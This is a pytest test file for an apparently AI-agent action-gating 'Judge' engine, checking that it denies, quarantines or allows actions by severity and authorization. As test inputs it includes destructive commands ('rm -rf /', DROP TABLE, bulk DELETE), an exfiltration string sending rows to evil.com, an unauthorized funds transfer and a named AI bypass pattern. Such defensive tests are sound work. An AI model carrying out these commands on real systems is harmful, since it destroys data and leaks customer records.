"""Enforcement Accuracy Tests — validate deterministic verdicts across incident types.

These tests verify that the Judge Layer produces the expected verdicts for
real-world high-risk scenarios. All tests use seeded NIST baselines.
"""

import pytest

from app.core.constants import JudgeVerdict
from app.judge.engine import JudgeEngine, JudgeInput


class TestEnforcementAccuracy:
    @pytest.fixture
    def engine(self):
        return JudgeEngine()

    # ------------------------------------------------------------------
    # G.1.1 — Destructive Actions (AGT-DEL-001)
    # ------------------------------------------------------------------

    @pytest.mark.asyncio
    async def test_drop_table_production_blocked(self, engine, seeded_db):
        """DROP TABLE on production → DENY (severity 10)."""
        inp = JudgeInput(
            action="DROP TABLE customers",
            agent_id="agent-prod-01",
            incident_type="AGT-DEL-001",
            severity="critical",
            auth_present=False,
            is_business_hours=False,
            source_ip_reputation="malicious",
            contains_system_commands=True,
            is_repeat_offender=True,
        )
        result = await engine.evaluate(seeded_db, inp)
        assert result.verdict == JudgeVerdict.DENY
        assert result.severity_score == 10
        assert result.latency_ms < 50

    @pytest.mark.asyncio
    async def test_drop_table_dev_allowed(self, engine, seeded_db):
        """DROP TABLE temp_cache on development with auth → ALLOW (severity 3)."""
        inp = JudgeInput(
            action="DROP TABLE temp_cache",
            agent_id="agent-dev-01",
            incident_type="AGT-DEL-001",
            severity="medium",
            auth_present=True,
            is_business_hours=True,
            source_ip_reputation="trusted",
        )
        result = await engine.evaluate(seeded_db, inp)
        assert result.verdict == JudgeVerdict.ALLOW
        assert result.severity_score <= 3

    @pytest.mark.asyncio
    async def test_rm_rf_production_blocked(self, engine, seeded_db):
        """rm -rf / on production → DENY (severity 10)."""
        inp = JudgeInput(
            action="rm -rf /",
            agent_id="agent-prod-01",
            incident_type="AGT-DEL-001",
            severity="critical",
            auth_present=False,
            is_business_hours=False,
            source_ip_reputation="malicious",
            contains_system_commands=True,
            is_repeat_offender=True,
        )
        result = await engine.evaluate(seeded_db, inp)
        assert result.verdict == JudgeVerdict.DENY
        assert result.severity_score == 10

    @pytest.mark.asyncio
    async def test_drop_table_prod_no_repeat_quarantined(self, engine, seeded_db):
        """DROP TABLE production without repeat offender → QUARANTINE (severity 8)."""
        inp = JudgeInput(
            action="DROP TABLE orders",
            agent_id="agent-prod-01",
            incident_type="AGT-DEL-001",
            severity="critical",
            auth_present=False,
            is_business_hours=False,
            source_ip_reputation="malicious",
            contains_system_commands=True,
            is_repeat_offender=False,
        )
        result = await engine.evaluate(seeded_db, inp)
        # base 9 + no_auth 3 + malicious 4 + system_cmds 1 = 17 → clamp 10
        assert result.severity_score == 10
        assert result.verdict == JudgeVerdict.DENY

    # ------------------------------------------------------------------
    # G.1.2 — Data Exfiltration (AGT-EXT-005)
    # ------------------------------------------------------------------

    @pytest.mark.asyncio
    async def test_bulk_export_blocked(self, engine, seeded_db):
        """Bulk export of 50,000 customer rows → DENY (severity 10)."""
        inp = JudgeInput(
            action="export 50000 rows to https://evil.com/dump",
            agent_id="agent-prod-01",
            incident_type="AGT-EXT-005",
            severity="high",
            auth_present=False,
            contains_exfiltration=True,
            source_ip_reputation="suspicious",
        )
        result = await engine.evaluate(seeded_db, inp)
        assert result.verdict == JudgeVerdict.DENY
        assert result.severity_score >= 9

    @pytest.mark.asyncio
    async def test_small_export_with_auth_allowed(self, engine, seeded_db):
        """Small export with valid auth → ALLOW (severity <= 6)."""
        inp = JudgeInput(
            action="export 10 rows to internal-reporting",
            agent_id="agent-prod-01",
            incident_type="AGT-EXT-005",
            severity="medium",
            auth_present=True,
            contains_exfiltration=True,
            source_ip_reputation="trusted",
            is_business_hours=True,
        )
        result = await engine.evaluate(seeded_db, inp)
        assert result.verdict == JudgeVerdict.ALLOW
        assert result.severity_score <= 6

    # ------------------------------------------------------------------
    # G.1.3 — Financial / Unauthorized Actions (AGT-FIN-002)
    # ------------------------------------------------------------------

    @pytest.mark.asyncio
    async def test_unauthorized_transfer_denied(self, engine, seeded_db):
        """Unauthorized $5,000 transfer → DENY (severity 10)."""
        inp = JudgeInput(
            action="transfer $5000 to account XK-9912",
            agent_id="agent-finance-01",
            incident_type="AGT-FIN-002",
            severity="high",
            auth_present=False,
            is_repeat_offender=True,
            source_ip_reputation="suspicious",
        )
        result = await engine.evaluate(seeded_db, inp)
        assert result.verdict == JudgeVerdict.DENY
        assert result.severity_score >= 9

    @pytest.mark.asyncio
    async def test_authorized_transfer_allowed(self, engine, seeded_db):
        """Authorized transfer with dual auth → ALLOW (severity <= 6)."""
        inp = JudgeInput(
            action="transfer $5000 to account XK-9912",
            agent_id="agent-finance-01",
            incident_type="AGT-FIN-002",
            severity="high",
            auth_present=True,
            dual_auth_present=True,
            source_ip_reputation="trusted",
            is_business_hours=True,
        )
        result = await engine.evaluate(seeded_db, inp)
        # base 7 + dual_auth(-2) + trusted(-1) + business_hours(-1) = 3
        assert result.verdict == JudgeVerdict.ALLOW
        assert result.severity_score <= 4

    # ------------------------------------------------------------------
    # G.1.4 — Auto-Contain Elevation
    # ------------------------------------------------------------------

    @pytest.mark.asyncio
    async def test_auto_contain_elevates_allow_to_quarantine(self, engine, seeded_db):
        """AGT-DEL-001 with high severity + auth → QUARANTINE due to auto-contain."""
        # AGT-DEL-001 baseline has auto_contain_enabled=True
        inp = JudgeInput(
            action="DELETE FROM users WHERE id < 1000",
            agent_id="agent-prod-01",
            incident_type="AGT-DEL-001",
            severity="high",
            auth_present=True,
            source_ip_reputation="unknown",
            contains_system_commands=True,
        )
        result = await engine.evaluate(seeded_db, inp)
        # base 7 + system_cmds 1 = 8 → QUARANTINE (auto_contain elevates if >=7)
        assert result.severity_score >= 7
        assert result.verdict != JudgeVerdict.ALLOW
        assert result.verdict in (JudgeVerdict.QUARANTINE, JudgeVerdict.DENY)

    # ------------------------------------------------------------------
    # G.1.5 — Fail-Closed Behavior
    # ------------------------------------------------------------------

    @pytest.mark.asyncio
    async def test_fail_closed_on_exception(self, engine, seeded_db):
        """Any exception during evaluation must return ESCALATE."""
        from unittest.mock import patch

        # Force an exception inside the evaluation logic
        with patch.object(engine, "_calculate_severity_score", side_effect=RuntimeError("forced error")):
            inp = JudgeInput(
                action="test",
                agent_id="agent-01",
                incident_type="AGT-DEL-001",
                severity="critical",
            )
            result = await engine.evaluate(seeded_db, inp)
            assert result.verdict == JudgeVerdict.ESCALATE
            assert result.severity_score == 10
            assert "fail_closed" in result.matched_rules

    # ------------------------------------------------------------------
    # G.1.6 — Bypass Pattern Escalation
    # ------------------------------------------------------------------

    @pytest.mark.asyncio
    async def test_bypass_escalates_to_deny(self, engine, seeded_db):
        """Medium severity + bypass pattern → escalated to DENY."""
        inp = JudgeInput(
            action="test",
            agent_id="agent-01",
            incident_type="AGT-BYP-014",
            severity="medium",
            auth_present=False,
            source_ip_reputation="suspicious",
        )
        result = await engine.evaluate(
            seeded_db, inp, bypass_patterns=["context_window_displacement"]
        )
        # base 5 + no_auth 3 + suspicious 2 = 10, + bypass +2 → still 10
        assert result.severity_score == 10
        assert result.verdict == JudgeVerdict.DENY
        assert "bypass:context_window_displacement" in result.matched_rules

    # ------------------------------------------------------------------
    # G.1.7 — Regulatory Tags
    # ------------------------------------------------------------------

    @pytest.mark.asyncio
    async def test_privacy_violation_has_gdpr_tag(self, engine, seeded_db):
        """AGT-PRV-015 must include GDPR regulatory tag."""
        inp = JudgeInput(
            action="leak customer PII to unauthorized recipient",
            agent_id="agent-01",
            incident_type="AGT-PRV-015",
            severity="high",
        )
        result = await engine.evaluate(seeded_db, inp)
        assert any("GDPR" in tag for tag in result.regulatory_tags)

    @pytest.mark.asyncio
    async def test_financial_has_pci_dss_tag(self, engine, seeded_db):
        """AGT-FIN-002 must include PCI_DSS regulatory tag."""
        inp = JudgeInput(
            action="unauthorized transfer",
            agent_id="agent-01",
            incident_type="AGT-FIN-002",
            severity="critical",
        )
        result = await engine.evaluate(seeded_db, inp)
        assert any("PCI_DSS" in tag for tag in result.regulatory_tags)
